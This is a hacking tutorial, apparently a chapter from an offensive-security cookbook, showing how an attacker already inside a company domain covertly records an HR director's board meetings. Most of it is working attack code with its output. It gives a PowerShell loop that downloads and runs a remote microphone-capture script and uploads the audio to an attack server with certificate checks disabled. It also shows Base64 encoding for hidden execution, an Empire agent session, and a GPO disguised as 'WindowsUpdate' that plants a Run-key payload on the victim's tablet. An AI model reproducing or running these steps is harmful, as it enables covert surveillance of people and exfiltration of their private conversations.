# Leveraging GPO for Data Exfiltration

*Note: this section continues from the previous cookbook on Domain and Database Exploitation and follows demonstrations from the book "How to Hack Like a GOD: Master the Secrets of Hacking Through Real Life Scenarios" (continuing from page no. 113)*

So far, we’ve successfully achieved two out of our three goals. The final objective—spying on board members—should be relatively straightforward, given our deep access within the company. To infiltrate board meetings, we only need to target a single attendee. Since we’re already inside the HR domain, the HR Director seems like the ideal candidate. A quick search in Active Directory reveals the details we need:

```
(Empire: HRAgent) > usemodule situational_awareness/network/powerview/get_user
(Empire: get_user) > set Filter description=*HR*
(Empire: get_user) > run
Job started: Debug32_br6of

description      : HR Director
displayname      : Elise Jansen
userprincipalname: ejansen@GBHR.CORP
name             : Elise Jansen
objectsid        : S-1-5-21-1930387874-2808181134-879091260-1117
samaccountname   : ejansen
```

With Elise’s details in hand, we can track her devices by analyzing connection logs from the domain controller:

```
(Empire: HRAgent) > usemodule situational_awareness/network/powerview/user_hunter
(Empire: user_hunter) > set UserName ejansen
(Empire: user_hunter) > run
```

Among the output, we find two machines associated with Elise:

```
[...]
ComputerName : WKHR0076.GBHR.CORP
IPAddress    : 10.40.55.76
[...]
ComputerName : SPHR0098.GBHR.CORP
```

We could target both machines, but the presence of two devices piques our interest. Why does Elise need two computers? Could SPHR0098 be her personal laptop? To learn more, we’ll fetch data about each device using the get_computer module:

```
(Empire: HRAgent) > usemodule situational_awareness/network/powerview/get_computer
(Empire: get_computer) > set ComputerName SPHR0098
(Empire: get_computer) > set FullData True
(Empire: get_computer) > run
Job started: Debug32_myli4

description      : Surface PRO
CN=SPHR0098,CN=Surface,CN=Computers,DC=GBHR,DC=CORP
name             : SPHR0098
[...]
```

Note: *the "set FullData True" option ensures that the get_computer module retrieves complete information about the target machine, including detailed attributes such as description, group membership, and more. This level of detail is crucial when trying to understand the role and usage of a particular device within the network.*

Now that we know SPHR0098 is a Microsoft Surface Pro, it’s likely her mobile device for quick notes or important meetings—like board meetings! This will be our target.

Despite the Surface Pro relying on the same Windows kernel as traditional workstations, scanning it for open ports reveals it’s locked down:

```
(Empire: HRAgent) > usemodule situational_awareness/network/portscan
(Empire: portscan) > use TopPorts 1000
(Empire: portscan) > use Hosts SPHR0098.GBHR.CORP
(Empire: portscan) > run
portscan completed!
```

Note: *the Microsoft Surface Pro, like many modern devices, is designed with security in mind. It likely has strict firewall rules and security settings that prevent exposure of network ports. Additionally, mobile devices, including Android phones, are typically locked down in a similar fashion to protect against unauthorized access. This makes traditional port scanning methods less effective, as these devices often restrict or entirely block incoming connections, minimizing their attack surface.*

*On a similar note, Android devices are (unlike traditional computers, laptops, and servers) designed with a different set of priorities, focusing on battery efficiency, security, and resource management. While they do run services in the background, these services are not the same as the ones you’d typically find on a computer or server.*

*Desktop operating systems like Windows or Linux are designed to run many background services persistently. These services handle everything from networking, file sharing, and remote access to system monitoring and updates. On Android background services are tightly controlled. Android prioritizes battery life and performance, so it aggressively manages these services, often suspending or terminating them when they’re not in active use. This means fewer opportunities for a port scan to detect open services. Also, Android devices typically have a more restrictive security model compared to desktop OSes. The platform encourages apps to run in isolation, with each app having its own sandboxed environment. This isolation reduces the likelihood of background services exposing open ports that could be exploited by attackers.*

*While some services like Google Play Services, messaging apps, or background sync services run persistently, they generally don’t expose ports in the same way. Many Android services communicate with servers through outbound connections rather than listening for inbound traffic, further reducing the surface area for traditional port scanning. In summary, Android devices are designed primarily for user interaction, not for running long-term services accessible over the network. This user-centric approach means that most services that could potentially expose ports are either turned off when not in active use or require explicit user permission to run.*

And with that (hopefully informative) digression out of the way, we are ready to continue with the demonstration:

This is proving to be more challenging than we thought. With no direct way in, we need to get creative. Fortunately, Windows has a feature that might just give us the edge we need. Remember when we discussed domain settings that can be pushed by the domain controller? What if we could configure a setting that tells a specific machine to execute a script? Enter Group Policy Objects (GPOs)!

GPOs allow us to push specific settings or scripts to targeted machines. Our plan is to create a GPO that targets the HR Director’s tablet and instructs it to run a PowerShell script every time Elise logs in. This script will record ambient audio using the device’s microphone and then upload it to our server every 10 minutes.

First, let’s look at the PowerShell script that does the recording. We’ll use the PowerSploit module Get-MicrophoneAudio by @sixdub and set up a loop to record and save the audio files:

```
while($true)
{
    $i++;
    $browser = New-Object System.Net.WebClient
    $browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
    IEX($browser.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1"));
    Get-MicrophoneAudio -path c:\users\ejansen\appdata\local\file$i.wav -Length 600
}
```

Note: *```$i++``` increments the variable ```$i``` each time the loop runs, ensuring that each audio file has a unique filename (e.g., file1.wav, file2.wav, etc.). This prevents the script from overwriting previous recordings.*

Overall, this script continuously records 10-minute audio clips, naming each file sequentially (e.g., file1.wav, file2.wav, etc.) to avoid overwriting. The audio is saved locally on the target’s device.

Next, we need to upload these recordings to our server. To avoid interrupting the recording process, the upload is handled by a background job:

```
while($true)
{
    $i++;
    $browser = New-Object System.Net.WebClient
    $browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
    IEX($browser.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1"));
    Get-MicrophoneAudio -path c:\users\ejansen\appdata\local\file$i.wav -Length 600

    start-job -Name Para$i -ArgumentList $i -ScriptBlock{
        $i = $args[0];
        $browser = New-Object System.Net.WebClient;
        $browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
        $browser.uploadFile("https://<AttackServer_ip>/", "c:\users\ejansen\appdata\local\file$i.wav");
    }
}
```

This second part of the script creates a new job (start-job) for each upload, allowing the script to continue recording without delays. The job uploads the file to a specified server, using a simple SSL bypass to accept any certificates, including self-signed ones.

By running this script via a GPO on Elise’s Surface Pro, we can silently capture and exfiltrate audio recordings from her meetings—potentially even those sensitive board meetings.

Also, here is more detailed breakdown of the second part of the script:

- The start-job cmdlet to handle the file upload in parallel with the audio recording. This prevents any recording downtime while the file is being uploaded.

```
start-job -Name Para$i -ArgumentList $i -ScriptBlock{}
```

- start-job: Starts a new job in the background, allowing the script to perform tasks concurrently.

- ```-Name Para$i```: Names the job with a unique identifier (Para1, Para2, etc.), again using the incremented $i variable.

- ```-ArgumentList $i```: Passes the current value of $i into the script block, ensuring that the correct file is uploaded.

**Inside the ScriptBlock:**

- ```$i = $args[0];```: This assigns the passed-in argument $i to the local variable $i within the script block. The args[0] represents the first argument in the list.

- ```$browser = New-Object System.Net.WebClient;```: Recreates the WebClient object for this job, as each job runs in its own process.

- ```$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;```: Again, sets the WebClient to use the default network credentials.

- ```[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};```: This line forces the script to accept any SSL/TLS certificate, even self-signed ones, without validation. This is crucial for sending files over HTTPS to a potentially suspicious server.

- ```$browser.uploadFile("https://<AttackServer_ip>/", "c:\users\ejansen\appdata\local\file$i.wav");```: Uploads the recorded audio file to the attacker's server using the WebClient's uploadFile method.

After dissecting this PowerShell script, we focus on securely transmitting the captured audio files. To do this, we’ll set up a simple HTTPS server using Python. This server will rely on OpenSSL to encrypt the data during transmission.

First, we need to generate a self-signed SSL certificate. This ensures that the data sent to our attack server is encrypted, even if the certificate is not trusted by default. Here's the command used to create the certificate:

```
root@AttackSrv:~# openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
Generating a 2048 bit RSA private key
..................................+++
..................................+++
writing new private key to 'server.pem'
```

Just a quick clarification:

- openssl req -new -x509: This initiates the creation of a new certificate (-new) and specifies that it should be a self-signed certificate (-x509).

- -keyout server.pem: Defines the output file for the private key. Both the certificate and the private key will be stored in server.pem.

- -out server.pem: Specifies the output file for the certificate, which in this case is also server.pem.

- -days 365: Sets the certificate’s validity period to 365 days.

- -nodes: Instructs OpenSSL to skip the option of encrypting the private key with a passphrase, allowing it to be used without additional prompts.

Once the certificate is generated, we can start the HTTPS server using a Python script:

```
root@AttackServer: ~# python simpleHTTPsUpload.py
Listening on port 443...
[...]
```

Note: this script can be sourced here: <https://github.com/sparcflow/GibsonBird/blob/master/chapter5/simpleHTTPsUpload.py>

The server is now up and running, waiting to receive the audio files that will be uploaded by the PowerShell script.

With our attack server in place, the next step is to encode the PowerShell script for easier execution via a Group Policy Object (GPO). By converting the script into a Base64-encoded string, we can embed it into a registry key or use it in a command line without worrying about script blocks being intercepted or altered.

Here’s how the encoding process works:

```
PS> $command = get-content .\record.ps1
PS> $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
PS> $encodedCommand = [Convert]::ToBase64String($bytes)
PS> write-host $encodedCommand
```

A short explanation:

- ```get-content .\record.ps1```: Reads the content of the PowerShell script file record.ps1.

- ```$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)```: Converts the script content into a byte array using Unicode encoding.

- ```$encodedCommand = [Convert]::ToBase64String($bytes)```: Encodes the byte array into a Base64 string, which can be easily transmitted or stored.

- ```write-host $encodedCommand```: Outputs the Base64-encoded string to the console.

This encoded string can then be executed using the following command:

```
Powershell.exe -NonI -W Hidden -enc aQBtAHAAbwByA[...] 
```

Notes:

- -NonI: Runs PowerShell in non-interactive mode (-NonI), which is ideal for scripts and commands that don’t require user input.

- -W Hidden: Ensures that the PowerShell window remains hidden, keeping the execution stealthy.

- -enc: Specifies that the following string is a Base64-encoded command.

Overall, this command will decode the Base64 string and execute the original PowerShell script, recording and uploading audio files as intended.

With the payload ready, the next step is to create and deploy a Group Policy Object (GPO) to execute it on the target machine. We'll start by initializing the necessary Group Policy modules in PowerShell. By wrapping the initialization in a PowerShell function, we can easily call it later on:

```
function initialize-gpo(){
    Add-WindowsFeature GPMC
    import-module group-policy
    write-output "Initialization Done!"
}
```

Notes:

- ```Add-WindowsFeature GPMC```: Installs the Group Policy Management Console (GPMC) feature, necessary for managing GPOs.

- ```import-module group-policy```: Imports the Group Policy module, enabling the use of GPO-related cmdlets within PowerShell.

- Wrapping this in a function allows for quick re-use and makes the script modular and cleaner.

Next, we create a new GPO named WindowsUpdate and target it to the GBHR domain controller, SR0088:

```
function create-gpo() {
    New-GPo -name WindowsUpdate -domain GBHR.CORP -Server SR0088.GBSHR.CORP
```

Notes:

- ```New-GPo -name WindowsUpdate```: Creates a new GPO named WindowsUpdate.

- ```-domain GBHR.CORP```: Specifies the domain to which the GPO will apply.

- ```-Server SR0088.GBSHR.CORP```: Defines the domain controller where the GPO will be created.

To ensure that only Elise's account on the computer SPHR0098 is affected, we set specific permissions on the GPO:

```
    Set-GPPermissions -Name "WindowsUpdate" -Replace -PermissionLevel GpoApply -TargetName "ejansen" -TargetType user
    Set-GPPermissions -Name "WindowsUpdate" -Replace -PermissionLevel GpoApply -TargetName "SPHR0098" -TargetType computer
    Set-GPPermissions -Name "WindowsUpdate" -PermissionLevel None -TargetName "Authenticated Users" -TargetType Group
```

Notes:

- ```Set-GPPermissions -Name "WindowsUpdate"```: Applies specific permissions to the WindowsUpdate GPO.

- ```-Replace```: Ensures that the existing permissions are replaced with the new ones.

- ```-PermissionLevel GpoApply```: Grants the GpoApply permission, allowing the specified target to apply the GPO.

- ```-TargetName "ejansen" and -TargetType user```: Targets Elise's user account.

- ```-TargetName "SPHR0098"``` and ```-TargetType computer```: Targets Elise's specific computer.

- ```-PermissionLevel None```: Removes the default permission for Authenticated Users, preventing other users from being affected by this GPO

To activate the GPO, we link it to the GBHR domain:

```
    New-GPLink -Name WindowsUpdate -Domain GBHR.CORP -Target "dc=gbhr,dc=corp" -order 1 -enforced yes
```

Notes:

- ```New-GPLink -Name WindowsUpdate```: Links the WindowsUpdate GPO to the specified domain.

- ```-Domain GBHR.CORP```: Specifies the domain to which the GPO is linked.

- ```-Target "dc=gbhr,dc=corp"```: Defines the target location within the Active Directory domain (in this case, the root of the gbhr.corp domain).

- ```-order 1```: Sets the GPO link order, determining the precedence of the GPO if multiple GPOs apply to the same target.

- ```-enforced yes```: Enforces the GPO, meaning its settings cannot be overridden by other GPOs with lower precedence.

Finally, we instruct the GPO to set up a Run registry key on Elise's tablet. This key will automatically execute our PowerShell payload the next time the device polls for new GPO settings:

```
    Set-GPRegistryValue -Name "WindowsUpdate" -key "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName MSstart -Type String -value "powershell.exe -NoP -sta -NonI -Enc aQBtAHAAbwByA [...]"
    write-output "Created GPO successfully!"
    #End of create-gpo function
}
```

Notes:

- ```Set-GPRegistryValue -Name "WindowsUpdate"```: Adds or modifies a registry key within the WindowsUpdate GPO.

- ```-key "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"```: Specifies the registry path where the new key will be created. The Run key is used to execute commands at user logon.

- ```-ValueName MSstart```: Names the registry entry. This name can be anything, but it’s usually something that blends in with typical Windows processes.

- ```-Type String -value "powershell.exe -NoP -sta -NonI -Enc aQBtAHAAbwByA [...]"```: Specifies the command to be executed, in this case, our Base64-encoded PowerShell payload.

Full code summary:

```
function initialize-gpo(){
    Add-WindowsFeature GPMC
    import-module group-policy
    write-output "Initialization Done!"
}

function create-gpo() {
    New-GPo -name WindowsUpdate -domain GBHR.CORP -Server SR0088.GBSHR.CORP
    
    Set-GPPermissions -Name "WindowsUpdate" -Replace -PermissionLevel GpoApply -TargetName "ejansen" -TargetType user
    Set-GPPermissions -Name "WindowsUpdate" -Replace -PermissionLevel GpoApply -TargetName "SPHR0098" -TargetType computer
    Set-GPPermissions -Name "WindowsUpdate" -PermissionLevel None -TargetName "Authenticated Users" -TargetType Group
    
    New-GPLink -Name WindowsUpdate -Domain GBHR.CORP -Target "dc=gbhr,dc=corp" -order 1 -enforced yes
    
    Set-GPRegistryValue -Name "WindowsUpdate" -key "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName MSstart -Type String -value "powershell.exe -NoP -sta -NonI -Enc aQBtAHAAbwByA [...]"
    write-output "Created GPO successfully!"
    #End of create-gpo function
}
```

1. Initialization: The GPO management tools are installed and prepared using the Add-WindowsFeature and import-module cmdlets.

2. Creation and Targeting: A new GPO named WindowsUpdate is created and targeted specifically to Elise's account and her device.

3. Permissions: Specific GPO permissions are set to ensure that only the intended user and device apply the GPO, while others are excluded.

4. Activation: The GPO is linked to the domain, ensuring it is enforced and takes precedence over others.

5. Execution: A registry key is set up to automatically run the PowerShell payload on Elise’s device whenever she logs in.

We load this script into the Empire agent’s memory using the scriptimport module and then call the initialization function to install the GPO modules. After that, we execute the create-gpo function to launch the payload:

```
(Empire: HRAgent) > scriptimport /root/gpo.ps1
gpo.ps1
script successfully saved in memory
(Empire: HRAgent) > scriptcmd initialize-gpo()
Job started: Debug32_Apm02
Initialization Done!
Created GPO successfully!
```

Note: *you might wonder why the script didn't automatically run the initialize-gpo function upon being imported. When you import a script in Empire (or most other environments), the script is loaded into memory, but it's not executed until you explicitly call the functions within it. This gives you more control, allowing you to call specific functions at the right moment instead of triggering the whole script immediately.*

With the GPO in place and the PowerShell payload deployed, you can now sit back and watch as files start to pour into your attack server. The GPO will continue to operate until you remove it, which you should do once the job is complete to clean up after yourself.

To remove the GPO and unlink it from the domain, you use the following commands:

```
PS> Remove-GPLink -Name WindowsUpdate -Target "OU=GBHR,dc=CORP"
PS> Remove-GPO -Name "WindowsUpdate"
```

Notes:

- ```Remove-GPLink```: This command unlinks the GPO from the specified Organizational Unit (OU) in the domain. It's important to do this first because unlinking the GPO effectively stops it from being applied to the target systems.

- ```Remove-GPO```: After unlinking, you can delete the GPO entirely. If you were to delete the GPO first, any links pointing to it would become invalid, but the GPO itself might linger in some form, potentially leading to confusion or issues down the line.

And with that, you've successfully completed the operation! This strategic use of GPOs demonstrates how even built-in Windows features can be leveraged in powerful ways, whether for system administration or, as shown here, for more covert purposes.
